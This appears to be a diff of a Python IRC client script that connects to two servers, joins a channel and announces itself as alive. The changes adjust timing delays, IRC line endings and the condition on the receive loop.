@@ -46,13 +46,13 @@ def ConnectToC1():
     """Handle Connection to Target Server."""
     print("**** Connecting to: " + C1_HOST+":"+str(C1_PORT) + " ****")
     C1_SOCK.connect((C1_HOST, C1_PORT))
-    time.sleep(3)
+    time.sleep(10)
     C1_SOCK.setblocking(False)
-    C1_SOCK.send("USER " + C1_NAME + " " + C1_NAME + " " + C1_NAME + " :bro\n")
-    time.sleep(3)
-    C1_SOCK.send("NICK " + C1_NAME + "\n")
-    time.sleep(3)
-    C1_SOCK.send("JOIN " + C1_CHAN + "\n")
+    C1_SOCK.send("USER " + C1_NAME + " " + C1_NAME + " " + C1_NAME + " :bro\r\n")
+    time.sleep(5)
+    C1_SOCK.send("NICK " + C1_NAME + "\r\n")
+    time.sleep(5)
+    C1_SOCK.send("JOIN " + C1_CHAN + "\r\n")
     time.sleep(3)
     CC_SOCK.send("PRIVMSG " + C1_CHAN + " " + C1_NAME + " ALIVE\n")
     C1_CONNECTED = True
@@ -73,8 +73,8 @@ if(CC_CONNECTED is False):
 #if(C1_CONNECTED is False):
 #    ConnectToC1()
 
-while True:
-    time.sleep(1)
+while CC_CONNECTED:
+    time.sleep(3)
     CC_BUFFER = CC_SOCK.recv(1024)
     print(CC_BUFFER)
     temp = string.split(CC_BUFFER, "\n")
